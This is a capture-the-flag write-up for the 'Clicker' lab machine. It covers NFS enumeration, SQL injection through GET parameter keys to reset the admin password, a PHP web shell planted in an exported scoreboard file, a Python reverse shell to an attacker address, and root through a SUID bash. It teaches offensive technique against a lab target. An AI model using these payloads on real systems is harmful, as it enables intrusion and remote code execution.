# NMAP

`/etc/hosts`


```
10.10.11.232 clicker.htb
```


```
Nmap scan report for 10.10.11.232
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp  open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33940/udp   mountd
|   100005  1,2,3      34783/tcp   mountd
|   100005  1,2,3      45829/tcp6  mountd
|   100005  1,2,3      57871/udp6  mountd
|   100021  1,3,4      33595/tcp6  nlockmgr
|   100021  1,3,4      35625/tcp   nlockmgr
|   100021  1,3,4      41915/udp6  nlockmgr
|_  100021  1,3,4      52306/udp   nlockmgr
2049/tcp open  nfs
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/5%OT=22%CT=1%CU=41294%PV=Y%DS=2%DC=I%G=Y%TM=6597D09A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=9)SEQ(
OS:SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=B)OPS(O1=M53AST11NW7%O2=M53AST11N
OS:W7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88
OS:%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53A
OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
```

# USER + ROOT

```bash
gobuster dir -u http://clicker.htb -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt -t 10 -k 
```

Some files found but we have the source code so it's usless continuing enumeration:

```bash
sudo nmap 10.10.11.232 --script='nfs-ls,nfs-showmount,nfs-statfs'
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 11:28 CET
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
| nfs-statfs: 
|   Filesystem    1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /mnt/backups  6053440.0  3258384.0  2466152.0  57%   16.0T        32000
| nfs-showmount: 
|_  /mnt/backups *
| nfs-ls: Volume /mnt/backups
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE     TIME                 FILENAME
| rwxr-xr-x   65534  65534  4096     2023-09-05T19:19:10  .
| ??????????  ?      ?      ?        ?                    ..
| rw-r--r--   0      0      2284115  2023-09-01T20:27:06  clicker.htb_backup.zip
|_
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
```

XSSes, in message errors, will them be useful?


```
http://clicker.htb/login.php?err=%3Cimg%20src=x%20onerror=alert`1`%3E

or once logged in 

http://clicker.htb/index.php?msg=%3Cimg%20src=x%20onerror=alert`1`%3E
```

Spiler: `No`

Let's get back to our nmap scan for `nfs`.

`nfs` is a sharing folder protocol just similar to samba.
We can mount has a volume since it does not requires password and we can investicate its content.

```
sudo mkdir /mnt/clicker_htb
sudo mount -t nfs -o vers=3 10.10.11.232:/mnt/backups/ /mnt/clicker_htb
```

version 2 `-o vers=2` seemed not to be supported. IN order to let it work i had to install `nfs-utils` otherwise a `dnsutils`kernel error message was created.

Since the permission we don;t have to create an user with the same uid of the remote system because `all` users can read and navigate the directory as shown by 
nmap information

once finished you can `sudo umount /mnt/clicker_htb/` the directory.

We have source code of the challenge called `cliver.htb_backup.zip`, we can extract it.

Of course its pure php has we could have already guessed from page extensions on the server.

I searched for some problems and my eyes dropped on some kind of type juggling.

In fact in `db_utils.php`(where all sql statements resides there are some kind of type-juggling like situations)

For example:

```php
function check_auth($player, $password) {
	global $pdo;
	$params = ["player" => $player];
	$stmt = $pdo->prepare("SELECT password FROM players WHERE username = :player");
	$stmt->execute($params);
	if ($stmt->rowCount() > 0) {
		$row = $stmt->fetch(PDO::FETCH_ASSOC);
		if(strcmp($row['password'], hash("sha256",$password)) == 0){
			return true;
		}
	}
	return false;
}
```
this function has the following check: `if(strcmp($row['password'], hash("sha256",$password)) == 0)`, it does not use `===`.

I searched for some kind of type juggling and here a possible attack could have been to use array in post request (or get or whatever) to trick `strcmp` to return `NULL`, and `NULL == 0` in PHP is true.
References: https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

The problem here is the presence of the hash funtion, in fact by looking at the code we cn notice that external inputs are firstly passed to hash function like this: `hash("sha256",$password)`.

This leads to throw an expetion by PHP application, which saves this statement from bad happenings.

The admin pages have a check on session to check the user role:

```php

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
```

In case of missing permission, we cannot navigate admin stuff.

Also a file called `diagnostic.php` has the following check:


```php
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
	}
```

Useless to say, that token md5 hash is uncrackable and a loss of time and resources.

All statements in `db_utils.php` are prepared statement and cannot be exploited for some kind of sql injection.

Are we sure????

There is a function called `save_profile` in `db_utils.php`

```php
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

this function is called by `save_game.php` page:


```php
if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
```

As the code says, we cannot change our role in the db, it would have be too easy.
Instead, `clicks` and `levels` are easily accepted and we can ""hack"" the game injecting fake points

```http
GET /save_game.php?clicks=2020&level=2 HTTP/1.1
Host: clicker.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/play.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=4nphpuhuujo7bc4eg2kf477l8a
Connection: close
```

Before to proceed we can check what kind of db we're facing and from `db_utils.php` we notice that it's mysql.

```php
$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);
```

Let's get back to our `save_profile` function.

The statements are prepared as always but if you look carefully, `$setStr` is not sanitized when passed to the query.

However we have to specify that values are parsed using `$pdo->quote($value)` which is basically safe. So the only injectable part of the query is the `key` of the dictionary, and not values! Howerver, in order to make a valid query we will look carefully to values too.

To understand better what happens when we try to inject to a key instad of a value in a get request I created a script called `2_virgula_vs_update_vulnerable_statement.php`.

You can run it in local.


Joking with mysql syntax on emulators online (or you can install via docker an instance very quicly) i found some working tricks in an update statement.

Remember again, that we're injected key, let's urlencode everything


```
%75%73%65%72%6e%61%6d%65%3d%28%73%65%6c%65%63%74%28%73%6c%65%65%70%28%33%29%29%29%2c%63%6c%69%63%6b%73=20
username=(select(sleep(3))),clicks=20

Result: UPDATE players SET username=(select(sleep(3))),clicks=20 WHERE username = $player

%63%6c%69%63%6b%73%3d%32%30%2c%63%6c%69%63%6b%73=20
clicks=20,level=20

Result: UPDATE players SET username=clicks=20,level=20 WHERE username = $player
```

Unfortunately, even if this seems to be a valid sytax, the injection didn't work. The first one query which was expected to make a delay on the response time, finishes in some ms, and the second query which should be able to update columns in db did not modify anything.

Actually here, I found that only the first query didn't work, while the second one, worked.

This is beacuse the diplayed variables `clicks` and `levels` are saved in `save_game.php` as session variables:

```php
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
```

so unless we don't logout and login again, we will not see the affected changes.

This injection works, and what if we can try to change admin password using this sql injection?

```
password='b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2' where username = 'test6'-- b
```

I was near to the solution already, but I had to do some more considerations.
So I wasted an hour to undertand the flow and then I realized that my first idea of changing admin password was right, in fact playing a little with mysql payloads with my `2_virgula_vs_update_vulnerable_statement` script led me to:

- send through burpsuite injections and check the syntax.
- Observing that a request with a key having spaces, has spaces converted to `_` characters in php applications.

I don't know if this works only for `PHP`.

For example, the injection:


```http
GET /test2.php?%74%65%73%74%20%74%65%73%74%2c%74%65%73%74=we HTTP/1.1
```

which is `test test,test=we`

will produce:

```sql
UPDATE players SET test_test,test=we WHERE username = cannot_changed
```

notice that for a working update statements in mysql we don't need parenthesis in `set` (example `SET (test_test,test=we)`) just `,` is fine.

so spaces gets changed in `_`. I bypassed the script using comments in query instead of using spaces.

The following paylaod works fine:

```
password='b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2'/**/where/**/username='admin'#
```

```http
GET /save_game.php?%70%61%73%73%77%6f%72%64%3d%27%62%31%33%33%61%30%63%30%65%39%62%65%65%33%62%65%32%30%31%36%33%64%32%61%64%33%31%64%36%32%34%38%64%62%32%39%32%61%61%36%64%63%62%31%65%65%30%38%37%61%32%61%61%35%30%65%30%66%63%37%35%61%65%32%27%2f%2a%2a%2f%77%68%65%72%65%2f%2a%2a%2f%75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27%23=we HTTP/1.1
Host: clicker.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=4nphpuhuujo7bc4eg2kf477l8a
Connection: close


```

where `b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2` is obtained as


```bash
echo -n "ciao" | sha256sum
```

we're in as admin!

So from the `export.php` page we can see the players above `1000000` ( `$threshold = 1000000;` can be seen from source) points will be displayed in the table.
These ones can eventually be exported using the export button.

```
Nickname	Clicks	Level
admin	999999999999999999	999999999
admin	999999999999999999	999999999
ButtonLover99	10000000	100
Paol	2776354	75
Th3Br0	87947322	1
```

When exporting them we can choose the extension of exported file


```http
POST /export.php HTTP/1.1
Host: clicker.htb
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://clicker.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/admin.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=4nphpuhuujo7bc4eg2kf477l8a
Connection: close

threshold=1000000&extension=txt
```

we can change the extension to php. It's clear that the purpose is to escalate a user to one of the showed ones in the page and then export a `php` page, which we can access to, in order to run commands using a `php` shell.

To achieve our goal we must do some tricks.

- #### First of all, i created another new user called `test20` for example.

> Remember that the `username` column in db is not the same of `nickname` column. Nickname column is the one showed by `export.php` and we must inject it.

- #### Login again as admin.

Once created the user and authenticated, we can use something similar to the payload used to change the passwrod, to change our nickname too.

In order to avoid problems with mysql I'll use mysql `HEX` function to encode the payload: `<?php system($_GET["cmd"]);?>`

`SELECT HEX('<?php system($_GET["cmd"]);?>')`

result encoded:

`3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E`

```sql
nickname=unhex('3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E')/**/where/**/username='test20'#
```
 
- #### Escalate user to the top of the scoreboard

We can use a well known call to do this

```http
GET /save_game.php?clicks=2000000000&level=999999999 HTTP/1.1
Host: clicker.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/play.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=4nphpuhuujo7bc4eg2kf477l8a
Connection: close
```

- #### Go back to administrator page and export table:

```http
POST /export.php HTTP/1.1
Host: clicker.htb
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://clicker.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/admin.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=4nphpuhuujo7bc4eg2kf477l8a
Connection: close

threshold=1000000&extension=php
```


```http
HTTP/1.1 302 Found
Date: Fri, 05 Jan 2024 15:07:15 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /admin.php?msg=Data has been saved in exports/top_players_5526snlq.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


```

- #### Finally, get the created file and use the injected php code to invoke a shell

```http
http://clicker.htb/exports/top_players_5526snlq.php?cmd=export%20RHOST=%2210.10.16.75%22;export%20RPORT=1234;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
```

We got a shell!

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

we're `www-data`

Let's do some enumeration (from `db_utils.php`) files so we can access to mysql:

```bash
mysql -uclicker_db_user -h localhost -pclicker_db_password
```

nothing useful, we alredy know everything.

We know user is called `jack`, let's search something interesting

```bash
find / -iname '*.*' -exec grep jack {} \; -print 2> /dev/null
```

I found nothing.

And now the funny part.

I got the both root and user with an unintented (I guess).

Running `lse.sh` we get the folloning.

```
[!] fst020 Uncommon setuid binaries........................................ yes!           
---                                                                                                       
/usr/bin/bash                                                                                             
/opt/manage/execute_query   
```

The intented was meant to investigate what is `/opt/manage/execute_query` and obtain user first and then root as always. 
But `bash` is suid too!

So I searched in https://gtfobins.github.io/gtfobins/bash/ for bash escalation and I found that when we have a bash running with suid, we can try to get root by simpling typing `bash -p`

and reading the documentation will let us to understand the why


```bash
     -p      Turn on privileged mode.  In this mode, the $BASH_ENV and $ENV
               files are not processed, shell functions are not inherited from
               the environment, and the SHELLOPTS, BASHOPTS, CDPATH, and GLOB
              IGNORE variables, if they appear in the environment, are ignored.
               If the shell is started with the effective user (group) id not
               equal to the real user (group) id, and the -p option is not
               supplied, these actions are taken and the effective user id is
               set to the real user id.  If the -p option is supplied at
               startup, the effective user id is not reset.
```

Got root and user in one :)